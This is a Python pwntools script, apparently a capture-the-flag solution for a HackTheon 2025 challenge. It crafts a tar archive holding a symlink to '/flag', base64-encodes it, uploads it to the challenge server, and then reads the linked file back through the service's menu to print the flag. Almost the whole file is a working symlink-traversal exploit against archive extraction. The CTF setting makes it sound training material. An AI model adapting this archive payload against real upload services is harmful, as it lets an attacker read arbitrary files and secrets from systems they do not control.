#!/usr/bin/env python3
from pwn import *
import tarfile, io, base64, os, sys

context.log_level = 'debug'

HOST = "hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com"
PORT = 32496

def payload(symlink_target="/flag", link_name="flag"):
    mem_file = io.BytesIO()
    with tarfile.open(fileobj=mem_file, mode="w") as tar:
        info = tarfile.TarInfo(name=link_name)
        info.type = tarfile.SYMTYPE
        info.linkname = symlink_target
        info.mode = 0o777
        info.mtime = 0
        tar.addfile(info)
    mem_file.seek(0)
    return base64.b64encode(mem_file.read()).decode()

def main():
    payload_b64 = payload()

    p = remote(HOST, PORT)
    p.recvuntil(b"base64:")
    p.sendline(payload_b64.encode())

    p.recvuntil(b"successfully extracted.")
    p.recvuntil(b"[0] Exit")
    p.recvline()
    p.recvline()

    p.sendline(b"1")

    p.recvuntil(b"File:")
    fname = p.recvline().strip()
    log.info(f"Reading {fname.decode()} ...")

    p.recvuntil(b"----------------------------------------\n")
    flag = p.recvline().decode().strip()
    print("\nGot flag:", flag)

    p.close()

if __name__ == "__main__":
    main()
